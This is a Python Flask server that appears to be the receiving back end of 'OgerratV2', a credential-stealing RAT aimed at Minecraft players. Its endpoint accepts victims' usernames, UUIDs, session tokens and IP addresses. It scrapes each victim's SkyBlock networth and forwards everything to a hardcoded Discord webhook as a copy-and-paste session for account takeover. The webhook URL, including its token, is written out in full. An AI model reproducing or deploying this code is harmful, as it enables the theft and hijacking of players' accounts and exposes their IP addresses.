import requests
import json
from flask import Flask, request
import datetime
from bs4 import BeautifulSoup

print("Server is on!")
app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Oger is on top!'

webhook_url = "https://discord.com/api/webhooks/1066456375892385893/0uRjg4RXsob4w7IbN8V_JIouIi5QPKMmnnc2Vq-2EX73nkrzv0mUXtU5Jv-4qCEOHBR1"

@app.route("/ogerskin", methods =["GET", "POST"])
def handle_request():
    data = request.get_json()

    INGAMENAME = data["IGN"]
    USERID = data["UUID"]
    TOKEN = data["SSID"]
    IP = data["IP"]
    current_datetime = datetime.datetime.now()
    formatted_datetime = current_datetime.strftime("%m-%d %H:%M")

    urlNW = f'https://sky.shiiyu.moe/stats/{INGAMENAME}'
    responseNW = requests.get(urlNW)

    if responseNW.status_code == 200:
        soup = BeautifulSoup(responseNW.text, 'html.parser')
        stat_names = soup.select('span.stat-name')
        for span in stat_names:
            if span.text == 'Networth: ':
                networth_value = span.find_next_sibling('span', class_='stat-value').text
                print(networth_value)
                NW = networth_value
                break
        else:
            NW = 'not found.'
    else:
        NW = 'not found.'

    embed = {
        "title": f"{INGAMENAME} was just beamed",
         "color": 242424,
         "author": {
              "name": f"🟡 Networth: {NW}"
        },
      "fields": [
          {
             "name": "Copy and Paste Session",
              "value": f"{INGAMENAME}:{USERID}:{TOKEN}"
          },
          {
                "name": "IP-Adress",
                "value": IP
         }
      ],
      "footer": {
          "text": f"🌟 OgerratV2 by Oger 🌟 -  {formatted_datetime} "
        }
       }

    payload = {
      "username": "OgerratV2",
      "avatar_url": "https://example.com/avatar.png",
      "embeds": [embed]
     }

    try:
        response = requests.post(webhook_url, json=payload)
        response.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)

    return str(data)

if __name__ == '__main__':
    app.run()
